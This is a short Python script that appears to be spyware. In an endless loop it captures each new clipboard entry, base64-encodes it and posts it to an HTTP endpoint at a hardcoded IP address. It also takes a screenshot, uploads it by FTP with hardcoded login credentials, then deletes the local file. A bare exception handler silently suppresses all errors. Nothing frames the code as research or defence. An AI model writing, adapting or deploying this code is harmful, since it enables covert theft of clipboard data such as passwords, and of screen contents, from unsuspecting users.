import pyperclip, requests, os, base64, time, pyautogui
from ftplib import FTP


lastclipboard = 0

while True:
	try:
		clipboard = pyperclip.paste()
		clipboardEncode = base64.b64encode(clipboard)
		if lastclipboard != clipboard:
			r = requests.post('http://10.101.200.40/clipboard.php?args=' + clipboardEncode)
			date = time.strftime('%X')
 
			# Take screenshot
			pic = pyautogui.screenshot()
			 
			# Save the image
			file = pic.save('Screenshot.png') 
			
			ftp = FTP('10.101.200.40')
			ftp.login("quentin","deborde")
			
			fileName = "Screenshot.png"
			file = open(fileName,'rb')              
			ftp.storbinary('STOR ' + date + "_" +fileName, file) 
			file.close()
			os.remove(fileName)
		lastclipboard = clipboard

	except:
		inutile = 1